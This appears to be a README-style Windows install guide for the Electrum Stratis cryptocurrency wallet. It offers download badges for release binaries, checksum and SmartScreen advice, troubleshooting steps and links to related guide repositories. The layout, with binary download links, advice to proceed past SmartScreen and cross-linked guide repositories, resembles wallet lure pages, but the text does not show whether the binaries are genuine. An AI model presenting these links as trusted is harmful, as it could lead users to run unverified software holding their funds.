![Electrum-Stratis](assets/banner-article.png)

# Install Electrum Stratis on Windows, step by step

<p align="center">A self-contained build and a clean first run</p>

<p align="center"><a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.exe"><img alt="Download for Windows" src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-089ae8?style=for-the-badge&labelColor=071727&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA4OCA4OCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTAgMTIuNCAzNS43IDcuNXYzNC4zSDB6TTQwIDYuOSA4OCAwdjQxLjhINDB6TTAgNDYuMmgzNS43djM0LjRMMCA3NS42ek00MCA0Ni4yaDQ4Vjg4bC00OC02Ljl6Ii8%2BPC9zdmc%2B&logoColor=ffffff"></a> <a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.dmg"><img alt="Download for macOS" src="https://img.shields.io/badge/DOWNLOAD-MACOS-089ae8?style=for-the-badge&labelColor=071727&logo=apple&logoColor=ffffff"></a> <a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.zip"><img alt="Download for Linux" src="https://img.shields.io/badge/DOWNLOAD-LINUX-089ae8?style=for-the-badge&labelColor=071727&logo=linux&logoColor=ffffff"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img alt="Windows" height="24" src="https://img.shields.io/badge/os-windows-089ae8?style=flat-square&labelColor=071727&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA4OCA4OCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTAgMTIuNCAzNS43IDcuNXYzNC4zSDB6TTQwIDYuOSA4OCAwdjQxLjhINDB6TTAgNDYuMmgzNS43djM0LjRMMCA3NS42ek00MCA0Ni4yaDQ4Vjg4bC00OC02Ljl6Ii8%2BPC9zdmc%2B&logoColor=ffffff"> | Windows 10 (1909) or later, 64-bit | [`electrum-stratis-v2.7.19.exe`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.exe) |
| <img alt="macOS" height="24" src="https://img.shields.io/badge/os-macos-089ae8?style=flat-square&labelColor=071727&logo=apple&logoColor=ffffff"> | macOS 12 or later | [`electrum-stratis-v2.7.19.dmg`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.dmg) |
| <img alt="Linux" height="24" src="https://img.shields.io/badge/os-linux-089ae8?style=flat-square&labelColor=071727&logo=linux&logoColor=ffffff"> | x64, Ubuntu 20.04 or later, or equivalent | [`electrum-stratis-v2.7.19.zip`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.zip) |

</div>

All versions, installers and checksums are on the [Electrum-Stratis v2.7.19 release page](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/tag/v2.7.19).

> Only download from this GitHub release page.

Installing on Windows takes five steps: download the Windows asset from the GitHub release page, compare its checksum, run it past SmartScreen deliberately, choose Create or Recover, and let the wallet reach the current height before trusting what it shows. The whole procedure needs no Python, no dependencies and no administrator rights beyond the installer itself. Electrum Stratis is a self-custody desktop wallet for the legacy Stratis chain.

## You'll see this if

<div align="center">

| What you see | What it means | What to do |
|---|---|---|
| SmartScreen "unrecognised app" | A build without a widely recognised publisher reputation | Verify the checksum, then proceed deliberately |
| A window asking to choose a password | The create flow, not a login | Cancel and choose Recover if you meant to restore |
| "Not Connected" after install | No peer answered yet | Fix the connection before judging the balance |
| An empty wallet on first run | No history until it reaches the current height | Let it sync |
| An installer asking for a seed | Never legitimate at this stage | Close it and delete the file |

</div>

The checksum step is the one worth slowing down for. Everything else is a sequence of ordinary choices.

## Why it happens

Windows adds two complications that other platforms do not. First, an unsigned or newly signed binary triggers SmartScreen, which is a reputation system rather than a virus scan: a genuinely new file has no reputation, so the warning is expected and the checksum is what replaces it as evidence. Second, installer and portable builds behave differently - one writes to the program folder and registers an uninstaller, the other runs from wherever it is unpacked, and users who mix them up conclude that their wallet "moved".

Neither complication is a fault. They are the price of running a desktop wallet on the most targeted operating system, where a tampered build is a realistic attack rather than a theoretical one.

The build that solves this is the maintained one, and its current release is on the [release page](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/tag/v2.7.19). It is self-contained: no system Python installation, no Qt libraries to chase, which removes the single largest source of installation failure on the wallet's history.

## Fix

1. **Download the Windows asset from the release page.** Use the page, not a search result, and confirm the file name matches the asset listed there.
2. **Compare the checksum before running it.** Compute the hash of the downloaded file and compare it with the published value. A mismatch means delete and re-download; it is never a warning to click through, and the checksum is the only evidence that the file is the one the project published ([Electrum Stratis security and keys](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/main/how-safe-is-the-desktop-wallet.md)).
3. **Run the installer and handle SmartScreen deliberately.** If the warning appears, confirm you are running the file you just verified, then proceed. Do not disable system protection to make a warning go away.
4. **Choose Create or Recover on first launch.** A new wallet shows the seed once and requires re-entry in shuffled order; a restore asks for the phrase and previews the addresses it derives before committing.
5. **Wait for the height to reach the current chain tip.** The connection panel shows the height and the age of the last block; an empty balance before that point is expected, not a symptom.
6. **Confirm which build is running.** The security posture view shows version, build date, commit hash and advisory status, so the installed file can be matched to the published one.

If you chose the portable asset, keep it in its own folder and treat that folder as the application - moving individual files out of it is what breaks a portable install.

## If that did not work

If the installer refuses to run, check the architecture: a 32-bit system needs a 32-bit build, and a 64-bit build will not start on it. Do not disable security software to force an installer; that turns a detection into a compromise.

If the application starts and immediately closes, run it from a terminal with its verbose flag, which prints the reason it will not proceed. That single line is usually more informative than any error dialog.

If the wallet runs but cannot connect, the installation is fine and the peer is the problem. Reinstalling will not change a network path, a firewall rule or a server that is down.

If Windows Defender quarantines the file after it ran, do not restore it from quarantine; re-download, re-verify and check the detection name before deciding anything.

## Prevention

- Keep the release page bookmarked and download from the bookmark.
- Save the checksum alongside the installer, so a later comparison is possible.
- Back up the wallet file after creating a wallet, before it holds funds.
- Test a restore with a small amount, so a fresh machine is a known procedure.
- Keep one installer only; delete older ones once the new build is confirmed.

## FAQ

### How do I install Electrum Stratis on Windows?

Download the Windows asset from the release page, verify its checksum, run it (allowing SmartScreen only after verification), then create or recover a wallet and let it sync. No Python or Qt installation is needed with the current build.

### Why does Windows warn me about the installer?

SmartScreen flags files without an established publisher reputation. The warning is a prompt to verify, not proof of tampering: compare the checksum with the published value, and only then decide.

### Should I use the installer or the portable build?

Either, consistently. The installer integrates with the system and gives you an uninstaller; the portable build runs from its own folder and leaves no registry entries. Mixing the two is what makes a wallet appear to have moved.

### Where are my wallet files kept?

Outside the application folder, in your user profile's application-data directory. That is why reinstalling or updating does not touch the funds, and why copying the program folder is not a backup.

<!-- DOWNLOAD-BLOCK -->

Keep the downloaded file until the wallet has synced once. If the install fails, its hash is the evidence you will want, and a deleted download cannot be checked. Installing to the default location also keeps the data directory where the next version expects it, which avoids the missing-wallet-file problem later.

## Related articles

- [Where to download the current build](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/main/where-to-get-the-current-build.md)
- [Which version is current, and is mine real?](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/main/which-release-is-current.md)
- [Three backup models: seed, wallet file and password](https://github.com/electrum-stratis-project/electrum-stratis-recovery/blob/main/seed-file-and-password-backups.md)
- [Why "Not Connected" happens](https://github.com/electrum-stratis-project/electrum-stratis-fixes/blob/main/wallet-says-not-connected.md)
